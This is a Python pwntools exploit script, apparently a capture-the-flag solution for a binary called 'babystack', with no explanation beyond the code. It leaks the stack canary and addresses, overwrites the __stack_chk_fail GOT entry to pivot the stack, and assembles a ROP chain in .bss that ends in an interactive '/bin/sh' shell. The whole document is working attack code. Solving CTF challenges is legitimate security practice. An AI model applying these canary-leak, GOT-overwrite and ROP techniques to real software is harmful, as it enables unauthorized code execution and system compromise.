#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *
import time

context.arch = 'amd64'

if args.REMOTE:
    p = remote('chall.ctf.bamboofox.tw', '10102')
else:
    p = process("./babystack")
    # p = process(["./lib/ld-2.29.so", "./babystack"], env={"LD_PRELOAD" : "./lib/libc-2.29.so"})

	
bss = 0x4034c8
stack_fail_got = 0x403420
leave_ret = 0x401235
syscall = 0x401437

p.sendafter("Name: \n", 'A'*0x10)
p.sendafter("Hello, please give me your token: \n", "BBBBBBBBBBBBBBBB")

p.sendafter("str1: \n", cyclic(0x9))

output = p.recvline()

canary = u64(output[0x9:0x10].rjust(8, '\x00'))
addr = u64(output[0x10:-1].ljust(8, '\x00'))

p.sendafter("str2: \n", cyclic(0xf))

addr2 = u64(p.recvline()[0xf:-1].ljust(8, '\x00'))


p.sendafter("str1: \n", "\x00" + cyclic(0xf))
p.sendafter("str2: \n", cyclic(0x28) + p64(canary) + p64(stack_fail_got + 0x50))

time.sleep(0.5)
p.send(p64(0x4013fd))


def build_rop(addr, payload):
    info("build_rop")
    time.sleep(0.5)
    p.send("\x00" + cyclic(0xf))

    time.sleep(0.5)
    p.send(cyclic(0x28) + p64(canary) + p64(addr))

    time.sleep(0.5)
    p.send(payload)


build_rop(bss, flat(flat(0x4014b2, 1, 1)))
build_rop(bss+0x18, flat(1, 1, 1))
build_rop(bss+0x30, flat(1, 0x4010f8, 0x7b))
build_rop(bss+0x48, flat(0x4014b2, 0, 1))
build_rop(bss+0x60, flat(0x403500, 0x403508, 0))


build_rop(bss+0x78, flat(0, 0x401498, syscall))



build_rop(bss+0x90, flat("/bin/sh\x00"))

build_rop(stack_fail_got + 0x50, flat(leave_ret))

p.interactive()
p.close()